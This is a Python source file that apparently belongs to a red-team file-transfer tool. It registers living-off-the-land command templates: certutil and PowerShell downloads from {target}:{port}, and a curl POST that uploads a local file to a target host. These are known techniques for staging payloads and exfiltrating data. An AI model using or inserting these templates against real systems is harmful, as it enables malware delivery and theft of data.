from typing import List, Optional
from core.models import CommandTemplate, Platform, Protocol


class CommandRegistry:
    def __init__(self):
        self._templates: List[CommandTemplate] = []

    def register(self, template: CommandTemplate) -> None:
        self._templates.append(template)

    def filter(
        self,
        platform: Optional[Platform] = None,
        protocol: Optional[Protocol] = None
    ) -> List[CommandTemplate]:
        results = self._templates

        if platform and platform != Platform.CROSS_PLATFORM:
            results = [
                t for t in results 
                if t.platform in (platform, Platform.CROSS_PLATFORM)
            ]

        if protocol:
            results = [t for t in results if t.protocol == protocol]

        return results


# Default Registry Setup
registry = CommandRegistry()

# Windows LOLBAS Examples
registry.register(CommandTemplate(
    name="certutil_http",
    binary="certutil.exe",
    platform=Platform.WINDOWS,
    protocol=Protocol.HTTP,
    template="certutil.exe -urlcache -split -f http://{target}:{port}/{file} output.txt",
    description="Fetches file using Windows built-in certificate utility."
))

registry.register(CommandTemplate(
    name="powershell_webrequest",
    binary="powershell.exe",
    platform=Platform.WINDOWS,
    protocol=Protocol.HTTPS,
    template="powershell.exe -Command \"Invoke-WebRequest -Uri https://{target}:{port}/{file} -OutFile out.bin\"",
    description="PowerShell standard WebRequest."
))

# Linux GTFOBins Examples
registry.register(CommandTemplate(
    name="curl_post",
    binary="curl",
    platform=Platform.LINUX,
    protocol=Protocol.HTTP,
    template="curl -X POST --data-binary @{file} http://{target}:{port}/upload",
    description="Standard cURL binary data transfer."
))
